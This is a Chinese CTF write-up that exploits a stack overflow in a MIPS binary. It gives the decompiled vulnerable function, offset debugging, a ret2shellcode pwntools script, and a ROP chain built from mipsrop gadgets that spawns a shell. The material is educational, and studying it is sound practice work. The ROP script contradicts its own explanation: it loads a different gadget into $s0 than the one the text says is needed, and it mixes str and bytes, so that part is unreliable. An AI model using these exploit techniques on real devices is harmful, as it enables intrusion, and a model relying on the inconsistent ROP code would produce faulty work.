# MIPS 栈溢出RoP

## 0x00 准备

- mipsrop 插件: https://github.com/tacnetsol/ida

## 0x01 题目

>题目来源： HWS夏令营结营赛题

- file : [pwn](./pwn)
```
$ file pwn
pwn: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=e0782ebdf0d70b808dba4b10c6866faeae35c620, not stripped
```
运行：`qemu-mips pwn ` 

## 0x02 PWN
保护措施：   
```
$ pwn checksec pwn
[*] '/home/mi/CTF/pwn-exercise/linux_mips_stack/mips_pwn_1/pwn'
    Arch:     mips-32-big
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

### 逆向
核心代码在pwn函数里。    
v6申请了512大小的堆块，`v15 = read(0, v6, 0x300);`在这read产生了堆的溢出。   
后面逻辑将堆块读取的字符按照`:`分割，将后面的字符写入v14，`memcpy(v14 + 1, v16 + 1, v17);`产生栈溢出，这个可以利用。    
```
bool pwn()
{
  int v0; // $v0
  _BOOL4 result; // $v0
  int v3; // [sp+0h] [+0h] BYREF
  int v4[2]; // [sp+10h] [+10h] BYREF
  _BYTE *v5; // [sp+18h] [+18h]
  _BYTE *v6; // [sp+1Ch] [+1Ch]
  unsigned int i; // [sp+20h] [+20h]
  int j; // [sp+24h] [+24h]
  int v9; // [sp+28h] [+28h]
  int v10; // [sp+2Ch] [+2Ch]
  int v11; // [sp+30h] [+30h]
  int *v12; // [sp+34h] [+34h]
  int *v13; // [sp+38h] [+38h]
  int *v14; // [sp+3Ch] [+3Ch]
  int v15; // [sp+40h] [+40h]
  int v16; // [sp+44h] [+44h]
  _BYTE *v17; // [sp+48h] [+48h]
  int v18[3]; // [sp+4Ch] [+4Ch] BYREF

  v6 = (_BYTE *)malloc(512);
  puts("Enter the group number: ");
  if ( !_isoc99_scanf("%d", v18) )
  {
    printf("Input error!");
    exit(-1);
  }
  if ( !v18[0] || v18[0] >= 0xAu )
  {
    fwrite("The numbers is illegal! Exit...\n", 1, 32, stderr);
    exit(-1);
  }
  v18[1] = (int)&v3;
  v9 = 36;
  v10 = 36 * v18[0];
  v11 = 36 * v18[0] - 1;
  v12 = v4;
  memset(v4, 0, 36 * v18[0]);
  for ( i = 0; ; ++i )
  {
    result = i < v18[0];
    if ( i >= v18[0] )
      break;
    v13 = (int *)((char *)v12 + i * v9);
    v14 = v13;
    memset(v6, 0, 4);
    puts("Enter the id and name, separated by `:`, end with `.` . eg => '1:Job.' ");
    v15 = read(0, v6, 768);
    if ( v13 )
    {
      v0 = atoi(v6);
      *v14 = v0;
      v16 = strchr(v6, 58);
      for ( j = 0; v6++; ++j )
      {
        if ( *v6 == 10 )
        {
          v5 = v6;
          break;
        }
      }
      v17 = &v5[-v16];
      if ( !v16 )
      {
        puts("format error!");
        exit(-1);
      }
      memcpy(v14 + 1, v16 + 1, v17);
    }
    else
    {
      printf("Error!");
      v14[1] = 1633771776;
    }
  }
  return result;
}
```

### 调试

运行:`qemu-mips ./pwn`    
产生了栈溢出     
```
=== Welcome to visit H4-link! ===
Enter the group number: 
1
Enter the id and name, separated by `:`, end with `.` . eg => '1:Job.' 
1:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
Segmentation fault (core dumped)
```
现在需要确定溢出的偏移，采用cyclic(0x150)方式，但是会莫名其妙飞掉，只能逆向+手工调试。     
调试出偏移是`b'1:'+0x90*b'a'+$ra`

## EXP

### ret2shellcode
我们通过qemu-user启动地址非随机，可以直接ret2shellcode执行。    
思路1（试错）：  
- 那现在知道sp的地址是0x76fff208，我们知道v14变量栈的相对值+0x2c，只需要知道v14与输入的数据的相对位置就可以。    
- 我们需要确定我输入的值传到栈上v14的相对位置是多少,可以通过cyclic方式来判断，在memcpy后下断点，查看栈上的值gaaa开头。   
- 但是这有个问题就是，这块到返回地址之间，空间不够，只能放到返回地址之后。    
```
>>> cyclic_find('gaaa')
24
```    
`memcpy(v14 + 1, v16 + 1, v17);`附近的汇编代码
```
.text:0040092C move    $a2, $a0
.text:00400930 move    $a1, $v0
.text:00400934 move    $a0, $v1
.text:00400938 la      $v0, memcpy
.text:0040093C move    $t9, $v0
.text:00400940 bal     memcpy
.text:00400944 nop
.text:00400948 lw      $gp, 0x58+var_48($fp)
.text:0040094C b       loc_400988
```
思路2：
- 找返回地址后的栈地址，通过调试为0x76fff2b0。     
- [exp.py](./exp.py)
```python
from pwn import *
context(arch="mips",endian="big",log_level="debug")

io = process(['qemu-mips','./pwn'])

io.sendlineafter("number: ",b'1')

payload = b'1:' 
payload += 0x90*b'a' +p32(0x76fff2b0)+asm(shellcraft.sh())
io.sendlineafter("eg => '1:Job.' ",payload)
io.interactive()
```

### rop
刚直接ret2shellcode，这是在栈地址不变的情况下，如果开了aslr，我就需要通过rop利用。     
思路——获取栈地址：  
1. 我们可以让一个栈地址拷贝到寄存器上，把shellcode写在这个栈空间。    
  mips.stackfind()可以满足这个需求。    
  Python>mipsrop.stackfinder()     
```
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  0x004273C4  |  addiu $a2,$sp,0x70+var_C                            |  jalr  $s0                             |
|  0x0042BCD0  |  addiu $a2,$sp,0x88+var_C                            |  jalr  $s2                             |
|  0x0042FA00  |  addiu $v1,$sp,0x138+var_104                         |  jalr  $s1                             |
|  0x004491F8  |  addiu $a2,$sp,0x44+var_C                            |  jalr  $s1                             |
|  0x0044931C  |  addiu $v0,$sp,0x30+var_8                            |  jalr  $s1                             |
|  0x00449444  |  addiu $a2,$sp,0x44+var_C                            |  jalr  $s1                             |
|  0x0044AD58  |  addiu $a1,$sp,0x60+var_28                           |  jalr  $s4                             |
|  0x0044AEFC  |  addiu $a1,$sp,0x64+var_28                           |  jalr  $s5                             |
|  0x0044B154  |  addiu $a1,$sp,0x6C+var_38                           |  jalr  $s2                             |
|  0x0044B1EC  |  addiu $v0,$sp,0x6C+var_40                           |  jalr  $s2                             |
|  0x0044B3EC  |  addiu $v0,$sp,0x170+var_130                         |  jalr  $s0                             |
|  0x00454E94  |  addiu $s7,$sp,0xB8+var_98                           |  jalr  $s3                             |
|  0x00465BEC  |  addiu $a1,$sp,0xC4+var_98                           |  jalr  $s0                             |
----------------------------------------------------------------------------------------------------------------
```
Found 13 matching gadgets
选取第一个，等同于 `0x004273C4	addiu $a2,$sp,0x64	jalr $s0`     
这样，我们将shellcode写在sp+0x64     
但是还需要执行$a2，为此要将$s0寄存器去执行这个任务。 
2. 找执行$a2的指令，即跳转，jalr $a2和jr $a2。  
这块插件支持的不好，我们只能打印所有的gadget的搜索` Python>mipsrop.stackfinder`。    
0x00421684     
```
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  0x004002FC  |  lw $ra,0x1C+var_s0($sp)                             |  jr    0x1C+var_s0($sp)                |
| ... |  ...      |  ...                      |
|  0x00421684  |  move $t9,$a2                                        |  jr    $a2                             |
```

3. 然后要衔接上这两个gadget，让$s0的值是0x00421684。
在MIPS的复杂函数的序言和尾声中，会保存和恢复s组寄存器，我们可以下pwn()函数尾声的汇编代码：    
`.text:00400A54 lw      $s0, 0x58+var_s0($sp)`      
在0x90控制了$ra，则我们在0x90-0x7c+0x58=0x6c处，即可控制$s0     
```
.text:00400A2C loc_400A2C:
.text:00400A2C move    $sp, $fp
.text:00400A30 lw      $ra, 0x58+var_s24($sp)
.text:00400A34 lw      $fp, 0x58+var_s20($sp)
.text:00400A38 lw      $s7, 0x58+var_s1C($sp)
.text:00400A3C lw      $s6, 0x58+var_s18($sp)
.text:00400A40 lw      $s5, 0x58+var_s14($sp)
.text:00400A44 lw      $s4, 0x58+var_s10($sp)
.text:00400A48 lw      $s3, 0x58+var_sC($sp)
.text:00400A4C lw      $s2, 0x58+var_s8($sp)
.text:00400A50 lw      $s1, 0x58+var_s4($sp)
.text:00400A54 lw      $s0, 0x58+var_s0($sp)
.text:00400A58 addiu   $sp, 0x80
.text:00400A5C jr      $ra
``` 


[exp_rop.py](./exp_rop.py)
```python
from pwn import *
context(arch="mips",endian="big",log_level="debug")
io = process(['qemu-mips','./pwn'])
io.sendlineafter("number: ",b'1')

sp_addr = 0x004273C4	#addiu $a2,$sp,0x64	jalr $s0
jalr_s0_addr = 0x00400CEC  #  move $t9,$s0  jalr  $s0 

payload = b'1:' 
payload += 'a'*0x6c + p32(jalr_s0_addr) + 'a'*0x20 + p32(sp_addr)
payload += 'a'*0x64 + asm(shellcraft.sh())
io.sendlineafter("eg => '1:Job.' ",payload)
io.interactive()
```
## Ref
- https://xuanxuanblingbling.github.io/ctf/pwn/2020/09/24/mips/#
